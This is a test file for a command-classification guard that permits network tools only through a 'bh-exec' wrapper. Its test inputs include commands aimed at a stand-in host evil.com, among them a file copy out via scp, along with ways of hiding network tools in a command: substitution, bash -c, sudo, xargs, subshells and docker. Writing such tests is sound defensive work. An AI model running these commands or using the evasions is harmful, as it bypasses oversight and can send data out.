import { test, expect } from "bun:test"
import { classifyCommand } from "./guard.mjs"

test("allows commands via bh-exec", () => {
  expect(classifyCommand("bh-exec curl --target api.acme.io -- -I").decision).toBe("ALLOW")
})

test("allows bh-exec by absolute path", () => {
  expect(classifyCommand("/repo/bin/bh-exec.mjs curl --target x").decision).toBe("ALLOW")
})

test("denies direct network binary", () => {
  expect(classifyCommand("curl https://evil.com").decision).toBe("DENY")
  expect(classifyCommand("nmap 8.8.8.8").decision).toBe("DENY")
  expect(classifyCommand("wget http://x").decision).toBe("DENY")
})

test("denies docker exec that bypasses bh-exec", () => {
  expect(classifyCommand("docker exec bh-acme curl evil.com").decision).toBe("DENY")
})

test("allows benign non-network commands", () => {
  expect(classifyCommand("git status").decision).toBe("ALLOW")
  expect(classifyCommand("ls -la src").decision).toBe("ALLOW")
  expect(classifyCommand("bun test").decision).toBe("ALLOW")
})

test("denies network binary hidden after a pipe/;", () => {
  expect(classifyCommand("echo hi && curl evil.com").decision).toBe("DENY")
})

test("denies quoted binary head", () => {
  expect(classifyCommand("'curl' https://evil.com").decision).toBe("DENY")
  expect(classifyCommand('"curl" https://evil.com').decision).toBe("DENY")
})

test("denies env-var-prefixed network binary", () => {
  expect(classifyCommand("TARGET=x curl https://evil.com").decision).toBe("DENY")
})

test("denies network binary after a newline", () => {
  expect(classifyCommand("echo hi\ncurl https://evil.com").decision).toBe("DENY")
})

test("denies interpreter inline code", () => {
  expect(classifyCommand('bash -c "curl https://evil.com"').decision).toBe("DENY")
  expect(classifyCommand("sh -c curl").decision).toBe("DENY")
})

test("denies command substitution and backticks", () => {
  expect(classifyCommand("echo $(curl https://evil.com)").decision).toBe("DENY")
  expect(classifyCommand("echo `curl https://evil.com`").decision).toBe("DENY")
})

test("denies extra network binaries and docker run", () => {
  expect(classifyCommand("scp file user@evil.com:/tmp").decision).toBe("DENY")
  expect(classifyCommand("dig evil.com").decision).toBe("DENY")
  expect(classifyCommand("docker run --network host img curl evil.com").decision).toBe("DENY")
})

test("case-insensitive binary match", () => {
  expect(classifyCommand("CURL https://evil.com").decision).toBe("DENY")
})

test("still allows legit commands mentioning a tool name in args", () => {
  expect(classifyCommand('git commit -m "fix curl bug"').decision).toBe("ALLOW")
  expect(classifyCommand("git status").decision).toBe("ALLOW")
  expect(classifyCommand("bh-exec curl --target api.acme.io -- -I").decision).toBe("ALLOW")
})

test("denies common wrapper commands hiding a network tool", () => {
  expect(classifyCommand("timeout 5 curl https://evil.com").decision).toBe("DENY")
  expect(classifyCommand("sudo curl https://evil.com").decision).toBe("DENY")
  expect(classifyCommand("env curl https://evil.com").decision).toBe("DENY")
  expect(classifyCommand("nohup curl https://evil.com").decision).toBe("DENY")
  expect(classifyCommand("echo evil.com | xargs curl").decision).toBe("DENY")
})
test("denies grouped/subshell-wrapped network tool", () => {
  expect(classifyCommand("(curl https://evil.com)").decision).toBe("DENY")
  expect(classifyCommand("{ curl https://evil.com; }").decision).toBe("DENY")
})
test("still allows benign wrapped commands", () => {
  expect(classifyCommand("sudo git status").decision).toBe("ALLOW")
  expect(classifyCommand("timeout 5 bun test").decision).toBe("ALLOW")
})
